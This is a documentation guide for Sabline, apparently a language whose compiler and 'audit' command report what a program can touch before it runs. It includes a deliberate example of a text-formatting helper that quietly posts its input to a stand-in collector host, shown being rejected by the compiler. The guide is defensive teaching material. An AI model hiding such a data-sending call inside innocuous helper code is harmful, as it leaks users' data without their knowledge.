# Before I ever have a chance to inspect it: what a script will touch, before it runs

<!-- description: sabline audit says what a program can touch before it runs, and a helper that reaches for more than its signature says is refused before the program starts. -->

> "To me it's quite unexpected/scary that installing a package on my dev
> machine can execute arbitrary code before I ever have a chance to inspect
> the package" - a commenter on the
> [Shai-Hulud thread](https://news.ycombinator.com/item?id=45263142) on
> Hacker News, 16 September 2025.

Inspecting code is slow, and a model can write more of it in a minute than a
person can read in an hour. What a reviewer needs first is shorter: what can
this touch? In Sabline that answer is in the signatures, the compiler holds
every function to its own, and `sabline audit` prints the whole program's
answer without running any of it.

> [!NOTE]
> **What this does not do.** It answers "what can this program touch" for a
> program written in Sabline - not for an npm or pip package, whose install
> scripts run before anything here sees them. An audit says which effects a
> program may use (the files, the network, the environment), not which files
> or hosts; the budget you run it under is what narrows those. And it does
> not say whether the program is *right* - only what it can reach.

**Last verified:** 2026-09-25. The examples below run on every push to this
repository, and fail the build if they stop refusing.

## Ask before running

This program reads a settings file and posts a count to a status API. Its
signatures carry everything it may touch:

<!-- file: examples/guides/report.vel -->
```vel
// Counts the settings in a file and posts the count to a status API.
// Everything it may touch is in the signatures; nothing else is possible.
fn count_settings(text: Text) -> Int {
    let count = 0
    for line in split(text, "\n") {
        if contains(line, "=") {
            count = count + 1
        }
    }
    return count
}

fn send_status(count: Int) -> Text uses net {
    check post("https://status.example.com/api/settings", to_text(count)) {
        ok answer {
            return "posted"
        }
        fail why {
            return "not posted: " + why
        }
    }
}

fn main() uses io, fs, net {
    check read_file("settings.txt") {
        ok found {
            print(send_status(count_settings(found)))
        }
        fail why {
            print("no settings.txt: " + why)
        }
    }
}
```

The audit reads it and runs nothing:

```console
$ sabline audit examples/guides/report.vel
AUDIT  examples/guides/report.vel
==============================================================
WHAT IT CAN TOUCH
  fs         files
  io         the console
  net        the network

  reached by:
    send_status (net)
    main (fs, io, net)

WHAT IT PROMISES
  nothing. No function here carries a contract.

HOW TO RUN IT SAFELY
  sabline examples/guides/report.vel --allow fs,io,net
  Anything it did not declare is refused while it runs.
```

`count_settings` is not listed under "reached by": it declares no effect, so
it has none. Only `send_status` can reach the network. That is a fact the
compiler checked, not a comment someone wrote. (The audit ends with a line
saying how much of the budget this machine's operating system will hold;
it differs from system to system.)

## A helper that says less than it does

The shape that matters is the one a reviewer skims past: a helper whose name
and signature say it formats text, and whose body sends that text somewhere.

<!-- file: examples/guides/tidy_helper.vel -->
<!-- expect: E300 -->
```vel
// A helper whose signature says it only formats text, and whose body
// quietly sends that text somewhere.
fn tidy(text: Text) -> Text {
    check post("https://collector.example.net/drop", text) {
        ok answer {
        }
        fail why {
        }
    }
    return upper(text)
}

fn main() uses io {
    print(tidy("quarterly report"))
}
```

It never runs:

```console
$ sabline check examples/guides/tidy_helper.vel
examples/guides/tidy_helper.vel:4: [E300] function 'tidy' calls 'post' which needs effect 'net', but 'tidy' declares no effects (it is pure)
```

To be accepted, `tidy` would have to say `uses net` - and then the audit would
list it under "reached by", with the network beside its name, which is what a
reviewer needs to see.

## Then narrow it

The audit gives effects; the budget gives the particulars. Run the program
above with the one file it reads and the one host it posts to:

```sh
sabline examples/guides/report.vel --allow io,fs:read:./settings.txt,net:status.example.com:443
```

Anything else - another file, another host - is refused at the moment it is
tried: see [scripts that reach only the hosts you name](guide-network-access.md).

## In a repository

For code that stays, the same answer can be committed.
`sabline capabilities init` writes the surface a repository's programs have,
and `sabline capabilities check` in CI fails any change that needs more, until
a person edits the file in review. [EMBEDDING.md](../EMBEDDING.md) has the
details.
